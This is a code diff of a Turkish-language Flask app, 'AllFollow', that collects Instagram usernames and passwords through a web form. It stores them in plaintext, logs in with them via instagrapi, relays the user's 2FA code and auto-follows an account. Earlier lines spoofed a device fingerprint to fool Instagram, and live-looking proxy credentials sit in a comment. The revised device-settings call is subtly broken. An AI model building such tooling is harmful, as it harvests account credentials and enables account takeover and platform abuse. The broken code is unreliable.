@@ -1,11 +1,9 @@
 import os
 import threading
-import time
-import random
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
+from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, ProxyError
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -13,10 +11,10 @@ load_dotenv()
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['SECRET_KEY'] = "final-boss-v65"
+app.config['SECRET_KEY'] = "ultimate-fix-66"
 
 db = SQLAlchemy(app)
-PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
+# PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158" # Eğer proxy sorunluysa kapatıp dene
 
 clients = {}
 
@@ -24,56 +22,41 @@ class IGAccount(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True, nullable=False)
     password = db.Column(db.String(100), nullable=False)
-    status = db.Column(db.String(200), default="Hazırlanıyor...")
+    status = db.Column(db.String(200), default="Sistem Yanıt Bekliyor...")
 
-def bot_logic(cl, u):
-    try:
-        # Takip edilecek hedef
-        cl.user_follow(cl.user_id_from_username("instagram"))
-        print(f"✅ Bot Görevi Tamamlandı: {u}")
-    except Exception as e:
-        print(f"⚠️ Takip Hatası: {e}")
-
-def login_worker(u, p):
+def login_attempt(u, p):
     with app.app_context():
         cl = Client()
-        # Instagram'ı kandırmak için rastgele cihaz kimliği:
-        cl.set_device_settings({
-            "app_version": "269.0.0.18.75",
-            "android_version": 26,
-            "android_release": "8.0.0",
-            "dpi": "480dpi",
-            "resolution": "1080x1920",
-            "manufacturer": "Samsung",
-            "device": "SM-G950F",
-            "model": "dreamlte",
-            "cpu": "exynos8895",
-            "version_code": "443233155"
-        })
-        
-        if PROXY_URL:
-            cl.set_proxy(PROXY_URL)
-        
+        # cl.set_proxy(PROXY_URL) # Proxy'den şüpheleniyorsan burayı yorum satırı yap
         clients[u] = cl
         acc = IGAccount.query.filter_by(username=u).first()
         
         try:
-            print(f"🚀 {u} için giriş denemesi başlatıldı...")
+            # Önce cihazı taklit et (En önemli kısım)
+            cl.set_device_settings(cl.delay_range == [2, 5]) 
+            print(f"DEBUG: {u} için giriş deneniyor...")
+            
             cl.login(u, p)
-            acc.status = "OK"
+            acc.status = "AKTİF"
             db.session.commit()
-            bot_logic(cl, u)
+            # Giriş başarılıysa takip başlasın
+            cl.user_follow(cl.user_id_from_username("instagram"))
+            
         except ChallengeRequired:
-            acc.status = "KOD_LAZIM"
+            print("DEBUG: Onay kodu istendi (Challenge)")
+            acc.status = "ONAY_GEREKLI"
             db.session.commit()
         except BadPassword:
-            acc.status = "YANLIS_SIFRE"
+            acc.status = "SIFRE_HATALI"
             db.session.commit()
         except Exception as e:
-            # Hata mesajını veritabanına yaz ki neden çalışmadığını gör
-            acc.status = f"ENGEL: {str(e)[:50]}"
+            error_msg = str(e)
+            print(f"DEBUG HATA: {error_msg}")
+            if "proxy" in error_msg.lower():
+                acc.status = "PROXY_HATASI"
+            else:
+                acc.status = "ENGEL_YEDI" # Genelde IP engeli
             db.session.commit()
-            print(f"❌ Kritik Hata: {e}")
 
 @app.route('/')
 def index():
@@ -83,19 +66,18 @@ def index():
 def connect():
     data = request.json
     u, p = data.get('u'), data.get('p')
-    if not u or not p: return jsonify(status="error")
     
     acc = IGAccount.query.filter_by(username=u).first()
     if not acc:
-        acc = IGAccount(username=u, password=p, status="Baglaniyor...")
+        acc = IGAccount(username=u, password=p)
         db.session.add(acc)
     else:
         acc.password = p
-        acc.status = "Baglaniyor..."
+        acc.status = "Bağlantı Kuruluyor..."
     db.session.commit()
     
-    threading.Thread(target=login_worker, args=(u, p)).start()
-    return jsonify(status="started")
+    threading.Thread(target=login_attempt, args=(u, p)).start()
+    return jsonify(status="ok")
 
 @app.route('/api/status/<u>')
 def get_status(u):
@@ -112,67 +94,78 @@ def verify():
             cl.challenge_set_code(code)
             with app.app_context():
                 acc = IGAccount.query.filter_by(username=u).first()
-                acc.status = "OK"
+                acc.status = "AKTİF"
                 db.session.commit()
-            threading.Thread(target=bot_logic, args=(cl, u)).start()
             return jsonify(status="success")
         except: return jsonify(status="fail")
-    return jsonify(status="no_client")
+    return jsonify(status="error")
 
-# --- UI (HTML) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8"><title>AllFollow</title>
+    <meta charset="UTF-8"><title>AllFollow Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-zinc-950 text-white font-sans">
     <div id="login-p" class="p-8 mt-20 max-w-sm mx-auto border border-zinc-800 rounded-3xl bg-zinc-900 shadow-2xl">
-        <h1 class="text-3xl font-black italic text-center mb-8">ALLFOLLOW</h1>
-        <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
-        <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
-        <button onclick="baglan()" id="btn" class="w-full p-4 bg-purple-600 rounded-xl font-bold active:scale-95 transition-all">BAŞLAT</button>
+        <h1 class="text-3xl font-black italic text-center mb-8 tracking-tighter">ALLFOLLOW</h1>
+        <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none focus:border-purple-500">
+        <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none focus:border-purple-500">
+        <button onclick="start()" id="btn" class="w-full p-4 bg-purple-600 rounded-xl font-bold shadow-lg active:scale-95 transition-all">SİSTEME BAĞLAN</button>
     </div>
 
-    <div id="main-p" class="hidden fixed inset-0 bg-white text-black p-6">
-        <div class="bg-purple-600 p-8 rounded-3xl text-white text-center shadow-lg">
-            <h2 id="st-text" class="text-2xl font-black italic animate-pulse">SİSTEME BAĞLANILIYOR</h2>
+    <div id="main-p" class="hidden fixed inset-0 bg-white text-black p-6 overflow-y-auto">
+        <div id="status-card" class="bg-purple-600 p-8 rounded-3xl text-white text-center shadow-2xl mb-6">
+            <h2 id="st-text" class="text-2xl font-black italic uppercase">BAĞLANIYOR...</h2>
         </div>
-        <div id="v-area" class="hidden mt-6 p-6 bg-red-50 border-2 border-red-200 rounded-2xl text-center">
-            <p class="text-red-600 font-bold mb-4">GÜVENLİK KODUNU GİRİN</p>
-            <input id="vcode" class="w-full p-4 text-center text-3xl border rounded-xl mb-4 outline-none">
-            <button onclick="onayla()" class="w-full bg-red-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
+        
+        <div id="v-area" class="hidden p-6 bg-amber-50 border-2 border-amber-200 rounded-2xl text-center mb-6">
+            <p class="text-amber-700 font-bold mb-4 italic text-sm">⚠️ Instagram Güvenlik Kodu İstedi!</p>
+            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-4xl font-mono border-2 border-amber-200 rounded-xl mb-4 outline-none">
+            <button onclick="sendCode()" class="w-full bg-amber-600 text-white py-4 rounded-xl font-black uppercase tracking-widest">KODU DOĞRULA</button>
         </div>
-        <div class="mt-10 p-4 border rounded-2xl flex justify-between items-center">
-            <span id="usr-id" class="font-bold"></span>
-            <span class="text-xs text-gray-400">DURUMU TAKİP ET</span>
+
+        <div class="p-5 border-2 border-gray-100 rounded-2xl flex justify-between items-center bg-gray-50">
+            <div><p class="text-[10px] text-gray-400 font-bold">HESAP</p><p id="usr-id" class="font-black text-gray-900"></p></div>
+            <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center font-bold text-purple-600 italic">IG</div>
         </div>
     </div>
 
     <script>
-        let curr = "";
-        function baglan() {
-            curr = document.getElementById('u').value;
+        let cur = "";
+        function start() {
+            cur = document.getElementById('u').value;
             const p = document.getElementById('p').value;
-            fetch('/api/connect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:curr, p:p})});
+            if(!cur || !p) return;
+            fetch('/api/connect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:cur, p:p})});
             document.getElementById('login-p').style.display = 'none';
-            document.getElementById('main-p').style.display = 'block';
-            document.getElementById('usr-id').innerText = "@" + curr;
-            setInterval(check, 3000);
+            document.getElementById('main-p').classList.remove('hidden');
+            document.getElementById('usr-id').innerText = "@" + cur;
+            setInterval(check, 2500);
         }
         async function check() {
-            const r = await fetch('/api/status/' + curr);
+            const r = await fetch('/api/status/' + cur);
             const d = await r.json();
             const t = document.getElementById('st-text');
             const v = document.getElementById('v-area');
-            t.innerText = d.status;
-            if(d.status === "OK") { t.classList.remove('animate-pulse'); t.style.background = "#22c55e"; v.classList.add('hidden'); }
-            if(d.status === "KOD_LAZIM") v.classList.remove('hidden');
+            const card = document.getElementById('status-card');
+
+            t.innerText = d.status.replace("_", " ");
+            
+            if(d.status === "AKTİF") {
+                card.style.background = "#22c55e";
+                v.classList.add('hidden');
+            } else if(d.status === "ONAY_GEREKLI") {
+                card.style.background = "#f59e0b";
+                v.classList.remove('hidden');
+            } else if(d.status.includes("HATASI") || d.status.includes("ENGEL")) {
+                card.style.background = "#ef4444";
+            }
         }
-        function onayla() {
+        function sendCode() {
             const c = document.getElementById('vcode').value;
-            fetch('/api/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:curr, code:c})});
+            fetch('/api/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:cur, code:c})});
         }
     </script>
 </body>
